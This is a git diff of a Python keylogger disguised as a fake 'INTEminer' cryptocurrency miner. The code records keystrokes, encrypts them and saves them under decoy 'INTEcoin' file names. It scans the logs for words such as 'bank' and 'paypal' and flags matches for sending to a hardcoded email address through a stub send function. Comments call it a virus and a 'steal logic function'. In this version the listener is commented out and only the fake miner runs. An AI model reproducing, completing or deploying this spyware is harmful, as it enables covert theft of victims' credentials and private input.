@@ -8,31 +8,32 @@ from os import path
 from pynput.keyboard import Key, Listener
 
 keys = []
-count = 0
-count2 = 0
-MAX_COUNT = 20  # every how many letters to save
-BUFFER_SIZE = 2  # every how many saves to send.
-FILE_PATH = "INTEcoin.dat"  # change data to logs at the end
+keystrokes_count = 0
+saves_count = 0
+KEYSTROKES_BUFFER_SIZE = 20  # How many keystrokes before saving
+SAVES_BUFFER_SIZE = 2  # How many saves before sending
+FILE_PATH = "Data/"  # File path to save stolen data
+TARGET_EMAIL = "intelogger@gmail.com" # Sender and receiver of the data
 
 
 class Encryption():
-    encryptKey = "bfSmGi_FREbBA4tiQhD23rxeArgAysjxpdCg2mMEjmk="  # generated via: Fernet.generate_key()
+    encryptKey = "bfSmGi_FREbBA4tiQhD23rxeArgAysjxpdCg2mMEjmk="  # Generated using Fernet.generate_key()
 
     @staticmethod
     def encrypt(text):
         """
         This function encrypts data and returns the encryption.
-        :param text: the data to be encrypted.
-        :return: the encrypted text
+        :param text: The data to be encrypted.
+        :return: The encrypted text.
         """
         return Fernet(Encryption.encryptKey).encrypt(text.encode())
 
     @staticmethod
     def decrypt(text):
         """
-        This function decript data and returns it as plain text.
-        :param text: the text to decrypt
-        :return: plain text decryption.
+        This function decrypts data and returns it as plain text.
+        :param text: The text to decrypt.
+        :return: The decrypted text.
         """
         return Fernet(Encryption.encryptKey).decrypt(text).decode()
 
@@ -50,134 +51,127 @@ class Encryption():
 
 def press(key):
     """
-    fucntion that comes from the listener of key pressed, logs the key presses and calls another function to log
-    them into a file.
-    :param key: the key pressed given from pynput module.
+    Activated by the listener every key press.
+    Checks counters and sends the data to the logging function.
+    :param key: The key pressed given from pynput module.
     """
-    if str(key) == "Key.esc":
+    if str(key) == "Key.esc": # Checks for program exit
         return False
-    global keys, count, count2
+    global keys, keystrokes_count, saves_count
     keys.append(key)  # append every pressed key.
-    count += 1  # keep track of how many keys.
-    if count == MAX_COUNT:
+    keystrokes_count += 1  # keep track of how many keys.
+    if keystrokes_count >= KEYSTROKES_BUFFER_SIZE:
         writer(keys)
-        count = 0
+        keystrokes_count = 0
         keys = []
-        count2 += 1
-    if count2 >= BUFFER_SIZE:
-        count2 = 0
+        saves_count += 1
+    if saves_count >= SAVES_BUFFER_SIZE:
+        saves_count = 0
         results()
-
-
-def release(key):
-    """
-    A function to act as an exit from the program, technically speaking it's here for now but as a virus we are not
-    interested on the user disabling it.
-    :param key: key pressed on the keyboard
-    :return: if it were to return false it would be to stop the listener.
-    """
-    if str(key) == "Key.esc":
-        return False
 
 
 def writer(log):
     """
-    Saves the log in a txt file
-    :param log: an array of pressed keys.
-    :return:
+    Saves the log in a dat file.
+    :param log: An array of pressed keys.
     """
-    mode = "wb"
-    if path.exists(FILE_PATH):
-        mode = "ab"
-    with open(FILE_PATH, mode) as file:
+    with open(FILE_PATH + "INTEcoin.dat", "ab") as file:
         toWrite = ""
-        for i, key in enumerate(log):
+        for i, key in enumerate(log): # Removes repeated spaces and enters
             if i > 0:
                 if str(key) == "Key.space" and str(log[i - 1]) == "Key.space":
                     continue
                 if str(key) == "Key.enter" and str(log[i - 1]) == "Key.enter":
-                    continue  # don't save multiple enters or spaces.
-            key = parse(str(key))  # it's better if it's a string from now on.
+                    continue
+            key = parse(key) # Converts the key to a readable character
             toWrite += key
         file.write(Encryption.encrypt(toWrite))
-        file.write(b"@")  # putting a separator for the encryption diod see Fernet using this as the cypher text.
+        file.write(b"@")  # Putting a separator for the encryption diod see Fernet using this as the cypher text
         file.close()
 
 
 def parse(key):
     """
-    takes a string of a key pressed and makes it human readable.
-    :param key: a string to parse into readable format.
-    :return: the key as readable as possible.
+    Takes a string of a key pressed and makes it human readable.
+    :param key: A string to parse into readable format.
+    :return: The key as readable as possible.
     """
-    if key == "'":  # handling the ' sign.
+    key = str(key)
+    if key == "'":  # Handling the ' sign
         return key
-    key = key.replace("'", "")  # delete ' ' from output
+    key = key.replace("'", "")  # Delete ' ' from output
     if key == "Key.enter" or key == "Key.space":
         return "\n"
     if "Key" in key:
-        return key + " " # if it has a "Key" parameter before add a space so it's more readable
+        return key + " " # If it has a "Key" parameter before add a space so it's more readable
     return key
 
 
 def results():
     """
-    steal logic function.
-    :return:
+    Steal logic function.
     """
     importantWords = ["bank", "hmo", "facebook", "mail", "paypal"]
     toSend = False
     message = ""
     accumulatedLog = []
-    for byt in Encryption.bytes_from_file(FILE_PATH):
+
+    for byt in Encryption.bytes_from_file(FILE_PATH + "INTEcoin.dat"): # Read stolen data file as chunks and save them in a list
         if byt == "@":
             accumulatedLog.append(message)
             message = ""
             continue
         message += byt
 
-    message = ""  # reusing the same name.
-    print(str(random.randint(1,1000)))
-    filename= "INTEcoin" + str(random.randint(1,10000)) + ".dat" #save encrypted data as "coins"
+    filename= FILE_PATH + "INTEcoin" + str(random.randint(1,10000)) + ".dat" # Save encrypted data as "INTEcoins"
 
-    with open(filename, "wb") as file:
+    message = ""  # Reusing the parameter
+    with open(filename, "wb") as file: # Saving the data in the new
         for mess in accumulatedLog:
-            message += Encryption.decrypt(mess.encode()) #decrypt the data
-            file.write(mess.encode()) #write the data on a random file for the "miner"
-    for word in importantWords: #checking if any sensitive data was inputted.
+            message += Encryption.decrypt(mess.encode()) # Decrypt the data
+            file.write(mess.encode()) # Write the data on a random file for the "miner"
+    for word in importantWords: # Checking if any sensitive data was inputted.
         if word in message:
             toSend = True
-    print(message)
+            break
     if toSend:
-        send(accumulatedLog, "email")  # send encrypted data.
-    # delete file to not send the same data again.
-    os.remove(FILE_PATH)
+        send(accumulatedLog)  # Send the encrypted data
+    os.remove(FILE_PATH + "INTEcoin.dat") # Delete file to avoid sending the same data again
 
 
-def send(data, email):
+def send(data):
+    """
+    Sends the data via email.
+    :param data: The data to send.
+    :param email: The email used to send. The email is the sender and the receiver.
+    """
+    global TARGET_EMAIL
     # Elad
-    # Send data to mail
+    # Send data to mail saved in parameter: TARGET_EMAIL
     # SMTP
     print(data)
 
 
-with Listener(on_press=press) as listener:
-    listener.join()
+#with Listener(on_press=press) as listener: # Keypress listener
+ #   listener.join()
 
 
-def miner():
-    print("welcome to INTEminer for INTEcoin!")
-    print("Mining")
-    INTEcoin=0
+def miner(): # Fake miner
+    print("Welcome to INTEminer for INTEcoins!")
+    print("Mining", end = "")
+    INTEcoins=0
     while True:
+        print(".", end = "")
         randomNumber=random.randint(1, 100)
-        time.sleep(randomNumber/20) #sleep for a random short time
-        print(".", end="")
+        time.sleep(randomNumber/20) # Sleep for a short random time
         if random.randint(1, 10) == 5:
-            INTEcoin += randomNumber
-            print("Mined a INTEcoin! You currently have {} coins!".format(INTEcoin))
+            INTEcoins += randomNumber
+            print("\nMined {} INTEcoins! You currently have {} coins!".format(randomNumber, INTEcoins))
+            print("Mining", end = "")
 
+"""
 if __name__ == '__main__':
     kl = Process(target = miner)
     kl.start()
-#miner()
+"""
+miner()
